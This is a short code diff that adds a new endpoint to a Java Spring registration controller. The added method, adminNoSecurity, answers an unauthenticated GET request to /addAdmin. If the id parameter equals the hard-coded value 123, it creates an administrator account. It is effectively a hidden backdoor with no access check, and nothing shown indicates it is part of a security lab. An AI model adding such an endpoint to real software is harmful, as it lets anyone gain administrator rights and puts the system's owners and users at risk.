@@ -240,4 +240,12 @@ public class RegistrationController extends AbstractNvkController {
 		return "test";
 	}
 
+	@RequestMapping(value = "/addAdmin", method = RequestMethod.GET, produces = "text/html")
+	public String adminNoSecurity(@RequestParam("id") long id, Model model) {
+		if (id == 123) {
+			userService.addAdmin();
+		}
+		return "redirect:/login";
+	}
+
 }
